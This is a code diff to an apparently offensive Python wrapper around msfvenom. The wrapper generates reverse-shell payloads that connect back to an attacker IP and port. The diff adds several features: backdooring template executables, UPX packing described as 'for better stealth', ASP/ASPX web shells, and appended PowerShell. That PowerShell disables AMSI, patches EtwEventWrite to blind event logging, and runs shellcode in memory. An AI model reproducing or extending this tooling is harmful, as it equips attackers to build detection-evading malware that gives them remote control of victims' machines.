@@ -8,7 +8,11 @@ import base64
 import re
 import socket
 import platform
+import shutil  # Added for checking if UPX is installed
 
+# Check if UPX is installed
+def is_upx_installed():
+    return shutil.which('upx') is not None
 
 # Function to resolve interface name to IP address
 def resolve_interface(interface):
@@ -97,49 +101,49 @@ def display_encoder_options(payload):
     
     # ---- POLYMORPHIC & HIGHLY RATED ENCODERS ----
     if is_x64:
-        polymorphic_encoders.append(("x64/zutto_dekiru", "Zutto Dekiru (x64) - Best for x64 AV Evasion"))
+        polymorphic_encoders.append(("x64/zutto_dekiru", "Zutto Dekiru (x64) - Best for x64 AV Evasion [manual]"))
     
     if "x86" in payload or (is_windows and not is_x64):
-        polymorphic_encoders.append(("x86/shikata_ga_nai", "Shikata Ga Nai - Polymorphic XOR (Excellent)"))
-        polymorphic_encoders.append(("x86/call4_dword_xor", "Call+4 Dword XOR - Polymorphic"))
-        polymorphic_encoders.append(("x86/countdown", "Countdown - Polymorphic"))
-        polymorphic_encoders.append(("x86/jmp_call_additive", "Jump/Call/Additive - Polymorphic"))
+        polymorphic_encoders.append(("x86/shikata_ga_nai", "Shikata Ga Nai - Polymorphic XOR [excellent]"))
+        polymorphic_encoders.append(("x86/call4_dword_xor", "Call+4 Dword XOR - Polymorphic [normal]"))
+        polymorphic_encoders.append(("x86/countdown", "Countdown - Polymorphic [normal]"))
+        polymorphic_encoders.append(("x86/jmp_call_additive", "Jump/Call/Additive - Polymorphic [normal]"))
     
     # ---- ALPHANUMERIC ENCODERS (good for WAF bypass) ----
     if "x86" in payload or (is_windows and not is_x64):
-        alphanumeric_encoders.append(("x86/alpha_mixed", "Alpha2 Alphanumeric Mixedcase - WAF Bypass"))
-        alphanumeric_encoders.append(("x86/alpha_upper", "Alpha2 Alphanumeric Uppercase - WAF Bypass"))
-        alphanumeric_encoders.append(("x86/unicode_mixed", "Unicode Alphanumeric Mixedcase - WAF Bypass"))
-        alphanumeric_encoders.append(("x86/unicode_upper", "Unicode Alphanumeric Uppercase - WAF Bypass"))
+        alphanumeric_encoders.append(("x86/alpha_mixed", "Alpha2 Alphanumeric Mixedcase - WAF Bypass [low]"))
+        alphanumeric_encoders.append(("x86/alpha_upper", "Alpha2 Alphanumeric Uppercase - WAF Bypass [low]"))
+        alphanumeric_encoders.append(("x86/unicode_mixed", "Unicode Alphanumeric Mixedcase - WAF Bypass [manual]"))
+        alphanumeric_encoders.append(("x86/unicode_upper", "Unicode Alphanumeric Uppercase - WAF Bypass [manual]"))
         # Good for bypassing input filters that remove non-alphanumeric chars
         # Removed as per user request: Non-Alpha and Non-Uppercase encoders
     
     # ---- PLATFORM SPECIFIC ENCODERS ----
     if is_php:
-        platform_specific_encoders.append(("php/base64", "PHP Base64 Encoder (Great)"))
-        platform_specific_encoders.append(("php/hex", "PHP Hex Encoder (Great)"))
-        platform_specific_encoders.append(("php/minify", "PHP Minify Encoder (Great)"))
+        platform_specific_encoders.append(("php/base64", "PHP Base64 Encoder [great]"))
+        platform_specific_encoders.append(("php/hex", "PHP Hex Encoder [great]"))
+        platform_specific_encoders.append(("php/minify", "PHP Minify Encoder [great]"))
     
     if is_cmd:
-        platform_specific_encoders.append(("cmd/base64", "Base64 Command Encoder (Good)"))
-        platform_specific_encoders.append(("cmd/echo", "Echo Command Encoder (Good)"))
-        platform_specific_encoders.append(("cmd/generic_sh", "Generic Shell Variable Substitution"))
-        platform_specific_encoders.append(("cmd/perl", "Perl Command Encoder"))
-        platform_specific_encoders.append(("cmd/ifs", "Bourne IFS Substitution - Firewall Bypass"))
+        platform_specific_encoders.append(("cmd/base64", "Base64 Command Encoder [good]"))
+        platform_specific_encoders.append(("cmd/echo", "Echo Command Encoder [good]"))
+        platform_specific_encoders.append(("cmd/generic_sh", "Generic Shell Variable Substitution [manual]"))
+        platform_specific_encoders.append(("cmd/perl", "Perl Command Encoder [normal]"))
+        platform_specific_encoders.append(("cmd/ifs", "Bourne IFS Substitution - Firewall Bypass [low]"))
         if is_windows:
-            platform_specific_encoders.append(("cmd/powershell_base64", "Powershell Base64 Command Encoder (Excellent)"))
+            platform_specific_encoders.append(("cmd/powershell_base64", "Powershell Base64 Command Encoder [excellent]"))
     
     # ---- OTHER SPECIALIZED EVASION ENCODERS ----
     if not is_cmd:
         # XOR-based encoders (good for AV evasion)
-        evasion_focused_encoders.append(("x86/xor", "XOR Encoder - Simple AV Bypass"))
-        evasion_focused_encoders.append(("x86/xor_dynamic", "Dynamic XOR - Variable Key"))
-        evasion_focused_encoders.append(("x86/context_cpuid", "Context CPUID - Hardware-based XOR"))
+        evasion_focused_encoders.append(("x86/xor", "XOR Encoder - Simple AV Bypass [normal]"))
+        evasion_focused_encoders.append(("x86/xor_dynamic", "Dynamic XOR - Variable Key [normal]"))
+        evasion_focused_encoders.append(("x86/context_cpuid", "Context CPUID - Hardware-based XOR [manual]"))
         
         # Add platform specific encoders that focus on evasion
         if is_windows or is_linux:
-            evasion_focused_encoders.append(("x86/opt_sub", "Sub Optimizer - Subtract encoding"))
-            evasion_focused_encoders.append(("x86/bloxor", "BloXor - Block-based XOR"))
+            evasion_focused_encoders.append(("x86/opt_sub", "Sub Optimizer - Subtract encoding [manual]"))
+            evasion_focused_encoders.append(("x86/bloxor", "BloXor - Block-based XOR [manual]"))
             
     # ---- AGGREGATE ALL ENCODER CATEGORIES ----
     # Add a header and the encoders from each category
@@ -218,12 +222,12 @@ def display_encoder_options(payload):
 def display_format_options(payload):
     formats = {
         "linux": ["elf", "sh"],
-        "windows": ["exe", "dll"],
+        "windows": ["exe", "dll", "asp", "aspx", "ps1"], # Added ps1 for all Windows payloads
         "php": ["php", "raw"],
         "java": ["war", "jar", "raw"],
         "cmd/unix": ["py", "sh", "raw"],
         "cmd/windows/reverse_powershell": ["ps1", "raw"],
-        "cmd/windows": ["bat", "raw"],
+        "cmd/windows": ["bat", "raw", "asp", "aspx", "ps1"], # Added ps1 here too
         "cmd": ["py", "raw"]
     }
      
@@ -280,7 +284,41 @@ def display_format_options(payload):
 try:
     ip = input("\033[93mIP attacker? [default:  tun0] \033[0m   ")
     port = input("\033[93mPORT attacker [default: 9000]?\033[0m   ")
-    file = input("\033[93mNAME OF FILE? [default:  shell]\033[0m   ")
+    
+    # Ask if user wants to use a template file
+    use_template = input("\033[93mUse template file (y/n)? [default: n] \033[0m   ")
+    template_path = ""
+    template_filename = ""
+    
+    if use_template.lower() == 'y' or use_template.lower() == 'yes':
+        template_path = input("\033[93mPath to template file (e.g., /home/yaniv/Downloads/calc.exe): \033[0m   ")
+        if template_path:
+            # Extract just the filename from the path
+            template_filename = os.path.basename(template_path)
+            # Extract name without extension to use as default output name
+            template_name = os.path.splitext(template_filename)[0]
+            
+            # Check if template file exists
+            if os.path.exists(template_path):
+                print(f"\033[92mTemplate file found: {template_filename}\033[0m")
+            else:
+                print(f"\033[91mWarning: Template file not found at {template_path}\033[0m")
+                template_path = ""  # Reset if file not found
+                template_filename = ""
+    
+    # Set default filename based on template if one was provided
+    default_filename = template_name if template_path else "shell"
+    
+    # Check if we're in the same directory as the template to avoid overwriting
+    if template_path and os.path.dirname(os.path.abspath(template_path)) == os.path.abspath(os.getcwd()):
+        print(f"\033[91mWarning: You're in the same directory as the template file.\033[0m")
+        print(f"\033[91mPlease use a different filename to avoid overwriting the template.\033[0m")
+        default_filename = f"{template_name}_payload"
+    
+    file = input(f"\033[93mNAME OF FILE? [default: {default_filename}]\033[0m   ")
+    if not file:
+        file = default_filename
+        
 except KeyboardInterrupt:
     print(f"\n\nexiting...\n\n")
     sys.exit(0)
@@ -288,12 +326,17 @@ if not ip:
     ip="tun0"
 if not port:
     port="9000"
-if not file:
-    file="shell"
 
 # Resolve the IP address if it's an interface name
 resolved_ip = resolve_interface(ip)
 print(f"Resolved IP: {resolved_ip}")
+
+# Initialize template variables if they're not defined (for backward compatibility)
+if 'template_path' not in locals():
+    template_path = ""
+if 'template_name' not in locals():
+    template_name = ""
+
 # Display payload and format options and get user choice
 try:
     print("PAYLOAD OPTIONS:")
@@ -324,7 +367,12 @@ except KeyboardInterrupt:
 if formatFile == "php":
     command = f"msfvenom -p {payload} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
 elif formatFile == "elf":
-    command = f"msfvenom -p {payload} -f {formatFile} -o {file} LHOST={ip} LPORT={port} {encoder}"
+    # Adding NOP sled for ELF format
+    if template_path and template_path.endswith('.elf'):
+        command = f"msfvenom -p {payload} -x {template_path} -f {formatFile} -o {file} LHOST={ip} LPORT={port} {encoder} -n 50"
+    else:
+        command = f"msfvenom -p {payload} -f {formatFile} -o {file} LHOST={ip} LPORT={port} {encoder} -n 50"
+   
 elif formatFile == "raw":
     # Print which encoder is being used (if any) for debugging
     if encoder:
@@ -345,18 +393,40 @@ elif formatFile == "raw":
 elif formatFile == "ps1":
     # PowerShell payloads need special handling
     command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+    print(f"\033[93mGenerating PowerShell payload that will be enhanced with memory execution code...\033[0m")
 elif formatFile == "py":
     # Generate Python payload directly without special processing
     command = f"msfvenom -p {payload} -f py -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile in ["asp", "aspx"]:
+    # Web payloads for Windows servers
+    command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+    print(f"\033[93mGenerated {formatFile.upper()} web payload. Deploy to a Windows IIS server.\033[0m")
 elif formatFile in ["sh", "bat"]:
-   
     if payload.startswith("cmd/"):
         # Add file extension for command payloads too
         command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
     else:
         command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile in ["exe", "dll"]:
+    # Use template for Windows executables if provided and add NOP sled
+    if template_path and template_path.endswith(('.exe', '.dll')):
+        command = f"msfvenom -p {payload} -x {template_path} -k -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder} -n 50"
+        print(f"\033[93mUsing template file: {template_path}\033[0m")
+    else:
+        command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder} -n 50"
+    print(f"\033[93mAdding 50 byte NOP sled to {formatFile.upper()} binary\033[0m")
 else:
-    command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+    if template_path:
+        # Try to use the template for other formats if format matches the template extension
+        template_ext = os.path.splitext(template_path)[1][1:]  # Get extension without dot
+        if template_ext.lower() == formatFile.lower():
+            command = f"msfvenom -p {payload} -x {template_path} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+            print(f"\033[93mUsing template file: {template_path}\033[0m")
+        else:
+            command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+            print(f"\033[93mTemplate file extension doesn't match output format. Not using template.\033[0m")
+    else:
+        command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
 
 
 print("Generated command:")
@@ -366,6 +436,31 @@ print("Executing...")
 try:
     # Execute the command
     os.system(command)
+    
+    if formatFile == "elf":
+        elf_file_path = file
+        if is_upx_installed():
+            print(f"\033[93mCompressing {elf_file_path} with UPX for better stealth...\033[0m")
+            upx_command = f"upx --best {elf_file_path}"
+            upx_result = os.system(upx_command)
+            if upx_result == 0:
+                print(f"\033[92mUPX compression applied to {elf_file_path}\033[0m")
+            else:
+                print(f"\033[91mUPX compression failed for {elf_file_path}\033[0m")
+        else:
+            print(f"\033[91mUPX not installed. Skipping compression for {elf_file_path}\033[0m")
+    elif formatFile in ["exe", "dll"]:
+        binary_file_path = f"{file}.{formatFile}"
+        if os.path.exists(binary_file_path) and is_upx_installed():
+            print(f"\033[93mCompressing {binary_file_path} with UPX for better stealth...\033[0m")
+            upx_command = f"upx --best {binary_file_path}"
+            upx_result = os.system(upx_command)
+            if upx_result == 0:
+                print(f"\033[92mUPX compression applied to {binary_file_path}\033[0m")
+            else:
+                print(f"\033[91mUPX compression failed for {binary_file_path}\033[0m")
+        elif os.path.exists(binary_file_path):
+            print(f"\033[91mUPX not installed. Skipping compression for {binary_file_path}\033[0m")
     
     # Add special execution code for Python files with cmd payloads
     if formatFile == "py" and payload.startswith("cmd/"):
@@ -400,6 +495,82 @@ try:
                 print(f"\033[92mYou can run it directly with: bash {sh_file_path}\033[0m")
             except Exception as e:
                 print(f"\033[91mError adding execution code: {e}\033[0m")
+                
+    # Enhance PowerShell payloads with memory allocation and execution code
+    if formatFile == "ps1":
+        ps1_file_path = f"{file}.{formatFile}"
+        if os.path.exists(ps1_file_path):
+            try:
+                # Read the original payload content
+                with open(ps1_file_path, 'r') as f:
+                    content = f.read()
+                
+                # Append memory allocation and execution code
+                with open(ps1_file_path, 'w') as f:
+                    f.write(content)
+                      # Start writing to file
+                    f.write("\n\n# === AUTO-INJECTED BY MVENOM ADVANCED ===\n")
+                    f.write("$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n")
+                    f.write("$field = $amsi.GetField('amsiInitFailed','NonPublic,Static')\n")
+                    f.write("$field.SetValue($null,$true)\n\n")
+
+                    f.write("$winFunc = @\"\n")
+                    f.write("using System;\n")
+                    f.write("using System.Runtime.InteropServices;\n")
+                    f.write("\n")
+                    f.write("public class Win32 {\n")
+                    f.write("    [DllImport(\"kernel32.dll\")]\n")
+                    f.write("    public static extern IntPtr LoadLibrary(string lpLibFileName);\n")
+                    f.write("\n")
+                    f.write("    [DllImport(\"kernel32.dll\", CharSet=CharSet.Ansi, SetLastError=true)]\n")
+                    f.write("    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);\n")
+                    f.write("\n")
+                    f.write("    [DllImport(\"kernel32.dll\", SetLastError=true)]\n")
+                    f.write("    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n")
+                    f.write("}\n")
+                    f.write("\"@\n\n")
+
+                    f.write("Add-Type $winFunc\n\n")
+                    f.write("$ntdll = [Win32]::LoadLibrary(\"ntdll.dll\")\n")
+                    f.write("$addr = [Win32]::GetProcAddress($ntdll, \"EtwEventWrite\")\n\n")
+                    f.write("$out = 0\n")
+                    f.write("[Win32]::VirtualProtect($addr, [System.UIntPtr]::op_Explicit(1), 0x40, [ref]$out) | Out-Null\n")
+                    f.write("[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)\n")
+                    f.write("[Win32]::VirtualProtect($addr, [System.UIntPtr]::op_Explicit(1), $out, [ref]$null) | Out-Null\n\n")
+
+                    f.write("$Kernel32 = @\"\n")
+                    f.write("using System;\n")
+                    f.write("using System.Runtime.InteropServices;\n")
+                    f.write("\n")
+                    f.write("public class Kernel32 {\n")
+                    f.write("    [DllImport(\"kernel32.dll\")]\n")
+                    f.write("    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n")
+                    f.write("    [DllImport(\"kernel32.dll\")]\n")
+                    f.write("    public static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint count);\n")
+                    f.write("    [DllImport(\"kernel32.dll\")]\n")
+                    f.write("    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n")
+                    f.write("    [DllImport(\"kernel32.dll\")]\n")
+                    f.write("    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n")
+                    f.write("}\n")
+                    f.write("\"@\n\n")
+
+                    f.write("try {\n")
+                    f.write("    Add-Type $Kernel32\n")
+                    f.write("} catch {\n")
+                    f.write("    # Ignore if already loaded\n")
+                    f.write("}\n\n")
+
+                    f.write("$size = $buf.Length\n")
+                    f.write("$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)\n")
+                    f.write("[Kernel32]::RtlMoveMemory($addr, $buf, $size)\n\n")
+                    f.write("$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)\n")
+                    f.write("[Kernel32]::WaitForSingleObject($thandle, [uint32]'0xFFFFFFFF')\n")
+                    f.write("# === END AUTO-INJECTED ===\n")
+                       
+                print(f"\033[92mEnhanced {ps1_file_path} with memory allocation and execution code\033[0m")
+                print(f"\033[92mThis PowerShell payload is now ready for direct execution on Windows\033[0m")
+            except Exception as e:
+                print(f"\033[91mError enhancing PowerShell payload: {e}\033[0m")
 except:
     print(f"\n\nexiting...\n\n")
     sys.exit(0)
